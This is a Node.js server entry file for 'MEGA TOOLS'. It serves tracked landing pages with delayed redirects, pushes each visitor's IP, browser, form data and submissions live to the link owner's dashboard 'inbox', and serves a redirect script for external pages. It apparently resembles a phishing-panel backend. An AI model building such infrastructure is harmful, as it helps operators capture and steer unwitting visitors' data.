// ============================================================
// MEGA TOOLS — MAIN SERVER ENTRY POINT (CLEAN)
// FIX: /s/:slug routes now serve Socket.IO Landing Page HTML
// FIX: apiBase = current server URL (not CLIENT_URL)
// FIX: Socket.IO auth — allow guest visitors (no token = guest)
// FIX: disconnect — 5s delay before removing from sessionSockets
// FIX: heartbeat Offline + disconnect Offline → statusMonitor handles ALL
// FIX: joinRoom — only authenticated users (not guests) can join room_
// FIX: sessionDelta → room-based emit (only session owner's dashboard)
// NEW: /mega-redirect.js — Smart Redirect Engine for external pages
// ============================================================

require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });

const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');

const CONFIG = require('./config');
const db = require('./database');
const {
  authRoutes, linksRoutes, sessionsRoutes, adminRoutes,
  dataRoutes, webhookRoutes, redirectRoutes, exportRoutes, themeRoutes,
  supportRoutes, uploadRoutes, marketplaceRoutes,
} = require('./routes');
const sessionManager = require('./services/sessionManager');
const Session = require('./models/Session');
const { toStringId } = require('./utils/helpers');
const { generateLandingPage } = require('./utils/landingHtml');
const { generateSmartRedirectScript } = require('./utils/smartRedirect');

const corsOrigin = function (origin, callback) {
  if (!origin) return callback(null, true);
  return callback(null, true);
};

const app = express();
app.set('trust proxy', 1);

if (CONFIG.IS_PRODUCTION) app.use(helmet());

app.use(cors({
  origin: corsOrigin, credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Cache-Control', 'Pragma', 'Expires'],
}));

app.use(express.json({ limit: '5mb' }));
app.use(cookieParser());

const globalLimiter = rateLimit({
  windowMs: CONFIG.RATE_LIMIT_WINDOW_MS, max: CONFIG.RATE_LIMIT_MAX,
  message: { message: 'Too many requests, please try again later.' },
  standardHeaders: false, legacyHeaders: false,
  skip: (req) => { if (req.path === '/api/health') return true; if (req.headers.upgrade) return true; return false; },
});

app.use('/api/', globalLimiter);

// ============================================================
// HTTP SERVER + SOCKET.IO
// ============================================================

const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: corsOrigin, methods: ['GET', 'POST'], credentials: true },
  pingTimeout: 60000, pingInterval: 15000,
});

// ============================================================
// SOCKET.IO AUTHENTICATION MIDDLEWARE
// FIX: Allow guest visitors (no token) — they are tracked by visitorId
// ============================================================

io.use(async (socket, next) => {
  try {
    const cookieStr = socket.handshake.headers.cookie || '';
    const tokenMatch = cookieStr.match(/auth_token=([^;]+)/);
    const cookieToken = tokenMatch ? tokenMatch[1] : null;
    const authHeader = socket.handshake.auth?.token || socket.handshake.headers?.authorization || '';
    const headerToken = authHeader.replace('Bearer ', '');
    const token = cookieToken || headerToken;

    // ✅ If no token, allow as GUEST (visitor on landing page)
    if (!token) {
      socket.user = null;
      socket.userId = null;
      socket.userRole = 'guest';
      return next();
    }

    const decoded = jwt.verify(token, CONFIG.JWT_SECRET);
    const allUsers = await db.users.read();
    const user = allUsers.find(u => toStringId(u._id) === decoded.id);

    if (!user) return next(new Error('User not found'));
    if (user.status === 'blocked') return next(new Error('Account blocked'));

    socket.user = user;
    socket.userId = toStringId(user._id);
    socket.userRole = user.role;
    next();
  } catch (err) {
    if (err.name === 'JsonWebTokenError' || err.name === 'TokenExpiredError') {
      // Invalid token → allow as guest
      socket.user = null;
      socket.userId = null;
      socket.userRole = 'guest';
      return next();
    }
    next();
  }
});

// ============================================================
// SOCKET STATE
// ============================================================

const sessionSockets = {};
const SOCKET_CLEANUP_INTERVAL = 30000;
const DISCONNECT_GRACE_PERIOD = 5000; // 5 seconds before removing from map
let cleanupTimer = null;

function cleanupStaleSockets() {
  const connected = new Set();
  io.sockets.sockets.forEach(s => connected.add(s.id));
  for (const [key, socketId] of Object.entries(sessionSockets)) {
    if (!connected.has(socketId)) delete sessionSockets[key];
  }
}

function startSocketCleanup() {
  if (cleanupTimer) clearInterval(cleanupTimer);
  cleanupTimer = setInterval(cleanupStaleSockets, SOCKET_CLEANUP_INTERVAL);
}

// ============================================================
// SOCKET CONNECTION
// ============================================================

io.on('connection', (socket) => {
  const clientIp = socket.handshake.address || 'unknown';

  if (socket.userId) {
    socket.join('user_' + socket.userId);
  }

  socket.on('session_init', async (data) => {
    const { trackingCode, visitorId } = data;
    if (!trackingCode) return;

    const sessionKey = visitorId || (trackingCode + '_' + clientIp);
    sessionSockets[sessionKey] = socket.id;
    socket.sessionKey = sessionKey;
    socket.trackingCode = trackingCode;
    socket.visitorId = visitorId;

    try {
      const baseCode = trackingCode.includes('_') ? trackingCode.split('_').pop() : trackingCode;
      const { session, isNew, matchType } = await Session.upsert({
        visitorId: visitorId || null,
        trackingCode,
        baseCode,
        entryUrl: baseCode,
        currentUrl: baseCode,
        ip: clientIp,
        browser: socket.handshake.headers['user-agent'] || 'Unknown',
        deviceType: 'Desktop',
        collectedTypes: ['session_init']
      });

      session.status = 'Online';
      session.isLive = true;
      session.lastActivity = new Date().toISOString();

      // FIX: Room-based emit — only session owner's dashboard receives sessionDelta
      const sessionData = {
        type: isNew ? 'new' : 'updated',
        timestamp: new Date().toISOString(),
        session: {
          _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
          isLive: session.isLive, status: session.status, lastActivity: session.lastActivity,
          clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
          baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
          ip: session.ip, browser: session.browser, formData: session.formData,
          redirectHistory: session.redirectHistory || [],
          lockedKeys: session.lockedKeys || [],
        }
      };
      // Emit to session owner's room only
      const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      io.to('room_' + ownerCode).emit('sessionDelta', sessionData);
    } catch (err) { console.error('[Socket] Init error:', err.message); }
  });

  socket.on('session_heartbeat', async (data) => {
    const { visitorId, trackingCode } = data || {};
    if (!visitorId && !trackingCode) return;
    try {
      await Session.upsert({
        visitorId: visitorId || null,
        trackingCode: trackingCode || '',
        baseCode: trackingCode || '',
        ip: clientIp,
        collectedTypes: ['heartbeat']
      });
    } catch (err) {}
  });

  // FIX: Only authenticated dashboard users can join room_
  // Visitors (guest) use direct socket emit (sessions.js L265-266), not room-based
  socket.on('joinRoom', (trackingCode) => {
    if (trackingCode && socket.userRole !== 'guest') {
      socket.join('room_' + trackingCode);
    }
  });

  // ✅ FIX: 5-second grace period before removing from sessionSockets
  socket.on('disconnect', async () => {
    if (socket.sessionKey && sessionSockets[socket.sessionKey] === socket.id) {
      const keyToDelete = socket.sessionKey;
      setTimeout(() => {
        if (sessionSockets[keyToDelete] === socket.id) {
          delete sessionSockets[keyToDelete];
        }
      }, DISCONNECT_GRACE_PERIOD);
    }
  });
});

startSocketCleanup();
app.set('io', io);
sessionManager.init(io, sessionSockets);

app.get('/api/health', async (req, res) => {
  const dbHealth = await db.health();
  res.json({ status: 'ok', timestamp: new Date().toISOString(), uptime: process.uptime(), database: dbHealth });
});

app.get('/api/inbox-health', async (req, res) => {
  try {
    const allSessions = await db.sessions.read();
    const dbHealth = await db.health();
    const now = Date.now();
    const active = allSessions.filter(s => !s.hiddenForAll);
    const live = active.filter(s => s.isLive);
    const offline = active.filter(s => !s.isLive || s.status === 'Offline');
    const online = active.filter(s => s.status === 'Online');
    const expired = active.filter(s => {
      const created = new Date(s.created_at || s.timestamp).getTime();
      return (now - created) >= 24 * 60 * 60 * 1000;
    });
    const totalSubmissions = active.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
    const uniqueVisitors = new Set(active.map(s => s.visitorId).filter(Boolean)).size;
    const socketCount = io.sockets.sockets.size;
    const memUsage = process.memoryUsage();
    res.json({
      success: true, timestamp: new Date().toISOString(), uptime: Math.round(process.uptime()),
      database: dbHealth,
      sessions: { total: allSessions.length, active: active.length, live: live.length, online: online.length, offline: offline.length, expired: expired.length, uniqueVisitors, totalSubmissions },
      socket: { connections: socketCount },
      memory: { rss: Math.round(memUsage.rss / 1024 / 1024) + 'MB', heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024) + 'MB' },
      config: { sessionTimeout: Math.round(CONFIG.SESSION_TIMEOUT_MS / 60000) + 'min', heartbeatInterval: Math.round(CONFIG.HEARTBEAT_INTERVAL_MS / 1000) + 's' }
    });
  } catch (err) { console.error('[InboxHealth] Error:', err); res.status(500).json({ success: false, message: err.message }); }
});

app.use('/api/auth', authRoutes); app.use('/api/links', linksRoutes); app.use('/api/sessions', sessionsRoutes);
app.use('/api/admin', adminRoutes); app.use('/api/data', dataRoutes); app.use('/api/webhook', webhookRoutes);
app.use('/api/redirect', redirectRoutes); app.use('/api/export', exportRoutes); app.use('/api/theme', themeRoutes);
app.use('/api/support', supportRoutes); app.use('/api/upload', uploadRoutes);
app.use('/api/marketplace', marketplaceRoutes);

app.post('/api/trigger-inbox-clean', async (req, res) => {
  res.json({ success: true, message: 'Auto-Clean disabled. Use manual Clear Inbox instead.' });
});

// ============================================================
// SMART REDIRECT ENGINE — Serve mega-redirect.js to external pages
// Zero impact on existing routes
// ============================================================
app.get('/mega-redirect.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.send(generateSmartRedirectScript(req));
});

// ============================================================
// Helper: get current server base URL for Socket.IO connection
// ============================================================
function getServerBaseUrl(req) {
  if (CONFIG.IS_PRODUCTION) {
    return req.protocol + '://' + req.get('host');
  }
  return `http://localhost:${CONFIG.PORT}`;
}

// ============================================================
// LANDING PAGE ROUTE — Serve Socket.IO HTML for visitors
// ============================================================

app.get('/s/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    const trackingCode = req.query.tc || '';
    const allLinks = await db.links.read();
    let link = allLinks.find(l => l.baseCode === slug);
    if (!link && trackingCode) {
      link = allLinks.find(l => {
        const code = l.baseCode || l.slug || '';
        return code === slug || code.includes(slug);
      });
    }

    if (!link) {
      return res.status(404).send('Link not found');
    }

    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    const tc = trackingCode || link.ownerTrackingCode || 'unknown';
    const code = link.baseCode || link.slug || slug;
    const finalTrackingCode = tc + '_' + code;

    const html = generateLandingPage({
      baseUrl: baseUrl || 'about:blank',
      trackingCode: finalTrackingCode,
      slug: code,
      apiBase: getServerBaseUrl(req),
      delay: 30000,
      heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS,
      chainData: null,
    });

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) {
    console.error('[LandingPage] Error:', err.message);
    res.status(500).send('Server error');
  }
});

app.get('/s/:slug/:trackingCode', async (req, res) => {
  try {
    const { slug, trackingCode } = req.params;
    const allLinks = await db.links.read();
    const link = allLinks.find(l => (l.baseCode || l.slug || '') === slug);

    if (!link) {
      return res.status(404).send('Link not found');
    }

    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    const code = link.baseCode || link.slug || slug;
    const finalTrackingCode = trackingCode + '_' + code;

    const html = generateLandingPage({
      baseUrl: baseUrl || 'about:blank',
      trackingCode: finalTrackingCode,
      slug: code,
      apiBase: getServerBaseUrl(req),
      delay: 30000,
      heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS,
      chainData: null,
    });

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) {
    console.error('[LandingPage] Error:', err.message);
    res.status(500).send('Server error');
  }
});

app.use((req, res) => { res.status(404).json({ message: 'Route not found' }); });
app.use((err, req, res, next) => {
  console.error('[Server] Error:', err.message);
  res.status(err.status || 500).json({ message: CONFIG.IS_PRODUCTION ? 'Internal server error' : err.message });
});

const PORT = CONFIG.PORT;

async function start() {
  try { await db.connect(); } catch (err) { console.log('[Startup] DB connect warning: ' + err.message); }

  console.log('[Startup] Checking for incompatible indexes...');
  try {
    const { MongoClient } = require('mongodb');
    const uri = CONFIG.MONGODB_URI;
    if (uri && uri.trim() !== '') {
      const tempClient = new MongoClient(uri, { serverSelectionTimeoutMS: 15000, connectTimeoutMS: 15000 });
      await tempClient.connect();
      console.log('[Startup] Connected to MongoDB for index cleanup');
      const tempDb = tempClient.db(CONFIG.MONGODB_DB);
      const indexes = await tempDb.collection('sessions').listIndexes().toArray();
      console.log('[Startup] Existing indexes: ' + indexes.map(i => i.name).join(', '));
      try { await tempDb.collection('sessions').dropIndex('unique_active_visitor'); console.log('[Startup] ✅ DROPPED: unique_active_visitor index'); }
      catch (e) { if (e.code === 27) { console.log('[Startup] ✅ Index already removed (not found)'); } else { console.log('[Startup] Index drop note: ' + e.message); } }
      await tempClient.close();
      console.log('[Startup] Index cleanup complete');
    } else { console.log('[Startup] No MONGODB_URI configured, skipping index cleanup'); }
  } catch (err) { console.log('[Startup] Index cleanup error (non-fatal): ' + err.message); }

  server.listen(PORT, () => console.log(`[Server] Running on port ${PORT}`));
}

start();

process.on('SIGTERM', async () => { if (cleanupTimer) clearInterval(cleanupTimer); sessionManager.stop(); await db.close(); server.close(() => process.exit(0)); });
process.on('SIGINT', async () => { if (cleanupTimer) clearInterval(cleanupTimer); sessionManager.stop(); await db.close(); server.close(() => process.exit(0)); });

module.exports = app;